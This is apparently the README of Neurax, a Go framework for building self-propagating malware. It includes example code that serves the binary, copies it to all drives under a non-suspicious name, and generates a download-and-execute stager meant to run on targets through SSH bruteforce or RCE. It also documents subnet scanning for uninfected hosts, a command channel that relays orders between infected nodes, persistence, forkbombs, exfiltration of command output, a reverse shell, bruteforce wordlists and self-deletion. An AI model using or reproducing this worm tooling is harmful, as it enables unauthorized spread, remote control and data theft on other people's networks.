<p align="center"> A framework that aids in creation of self-spreading software</p>

## Requirements
`go get -u github.com/redcode-labs/Coldfire`

`go get -u github.com/yelinaung/go-haikunator`

## Usage
With help of Neurax, Golang binaries can spread on local network without using any external servers.

Diverse config options and command stagers allow rapid propagation across various wireless environments.
### Example code

```go
package main
import . "github.com/redcode-labs/Neurax"

func main(){

  //Specify serving port and stager to use
  N.Port = 5555
  N.Stager = "wget"

  //Start a server that exposes the current binary in the background
  go NeuraxServer()
 
  //Copy current binary to all logical drives
  NeuraxDisks()

  //Create a command stager that should be launched on target machine
  //It will download, decode and execute the binary
  cmd_stager := NeuraxStager()

  /* Now you have to somehow execute the command generated above.
     You can use SSH bruteforce, some RCE or whatever else you want ;> */

}
```

### Finding new targets
Function `NeuraxScan(func(string))` enables detection of active hosts on local network.
It's only argument is a callback function that is called in background for every active host.
Host is treated as active when it has at least 1 open port, is not already infected + fullfils conditions specified within `N`.

`NeuraxScan()` runs as infinite loop - it scans whole subnet specified by `.Cidr` config entry and when every host is scanned, function sleeps for an interval given in `.ScanInterval`.

### Disks infection
  Neurax binary doesn't have to copy itself using wireless means.
  Function `NeuraxDisks()` copies current binary (under non-suspicious name) to all logical drives that were found.
  Copied binary is not executed, but simply resides in it's destination waiting to be run.
  `NeuraxDisks()` returns an `error` if list of disks cannot be obtained or copying to any destination was impossible.

Another function, `NeuraxZIP(num_files int) err` allows to create a randomly named .zip archive containing current binary.
It is saved in current directory, and contains up to `num_files` random files it.

`NeuraxZIPSelf()` simply zips the current binary, creating an archive holding the same name.

### Synchronized command execution
Function `NeuraxOpenComm()` (launched as goroutine) allows binary to receive and execute commands.
It listens on port number specified in `.CommPort` using protocol defined in `.CommProto`.
Field `.CommProto` can be set either to `"tcp"` or `"udp"`.
Commands that are sent to the port used for communication are executed in a blind manner - their output isn't saved anywhere.

An optional preamble can be added before the command string.

Format: `:<preamble_letters> <command>` 

Example command with preamble might look like this: `:ar echo "pwned"`

Following characters can be specified inside preamble:
* `a`  - received command is forwarded to each infected node, but the node that first received the command will not execute it
* `x`  - received command will be executed even if `a` is specified
* `r`  - after receiving the command, binary removes itself from infected host and quits execution
* `k`  - keep preamble when sending command to other nodes
* `s`  - sleep random number of seconds between 1 and 5 before executing command
* `q`  - after command is executed, the machine reboots
* `o`  - command is sent to a single, random node. `a` must be specified
* `v`  - output of executed command is sent to an address specified under `.ExfilAddr`
* `m`  - mechanism that prevents re-execution of commands becomes disabled just for this specific command 
* `l`  - command is executed in infinite loop
* `e`  - command is executed only if the node has elevated privilleges
* `p`  - command becomes persistent and is executed upon each startup
* `d`  - output of executed command is printed to STDOUT for debugging purpose
* `f`  - forkbomb is launched after command was executed
* `!`  - if command was executed with errors and `a` is specified, this command is not forwarded

By default, raw command sent without any preambles is executed by a single node that the command was addressed for.

It is also important to note that when `k` is not present inside preamble, preamble is removed from command right after the first node receives it.

#### Example 1 - preamble is not forwarded to other nodes:

```go
 (1) [TCP_client]    ":ar whoami" -----> [InfectedHost1] 
 (2) [InfectedHost1] "whoami"     -----> [InfectedHostN]
 
    [InfectedHost1] removes itself after command was sent to all infected nodes in (2)
     because "r" was specified in preamble. "x" was not specified, so "whoami" was not executed by [InfectedHost1] 
```
#### Example 2 - preamble is forwarded:

```go
 (1) [TCP_client]    ":akxr whoami"  -----> [InfectedHost1] 
 (2) [InfectedHost1] ":akxr whoami"  -----> [InfectedHostN]
 (n) [InfectedHostN] ":axkr whoami"  -----> ...............
 .................................   -----> ...............

 Both [InfectedHost1] and [InfectedHostN] execute command and they try to send it to another nodes with preamble preserved
```


### Reverse connections
An interactive reverse shell can be established with `NeuraxReverse()`.
It will receive commands from hostname specified inside `.ReverseListener` in a form of `"<host>:<port>"`.
Protocol that is used is defined under `.ReverseProto`
If `NeuraxOpenComm()` was started before calling this function, each command will behave as described in above section.
If it was not, commands will be executed locally.

Note: this function should be also runned as goroutine to prevent blocking caused by infinite loop used for receiving.

### Cleaning up
Whenever `"purge"` command is received by a node, it resends this command to all other nodes, removes itself from host and quits.
This behaviour can be also commenced using `NeuraxPurge()` executed somewhere in the source.

### Wordlist creation
If spread vector of your choice is based on some kind of bruteforce, it is good to have a proper wordlist prepared. 
Storing words in a text-file on client side isn't really effective, so you can mutate a basic wordlist using `NeuraxWordlist(...words) []string`.
To permute a set of given words, use `NeuraxWordlistPermute(..words) []string`

### Setting time-to-live 
If you want your binary to remove itself after given time, use `NeuraxSetTTL()` at the beginnig of your code.
This function should be launched as a goroutine.
For example:

`go NeuraxSetTTL("2m")`

will make the binary run `NeuraxPurgeSelf()` after 2 minutes from initial execution.

### Using multipla stagers at once
If you would like to chain all stagers available for given platform, set `.Stager` to `"chain"`.

### Moving the dropped binary
If you need to copy the binary after initial execution, use `NeuraxMigrate(path string)`.
It will copy the binary under `path`, remove current binary and execute newly migrated one.
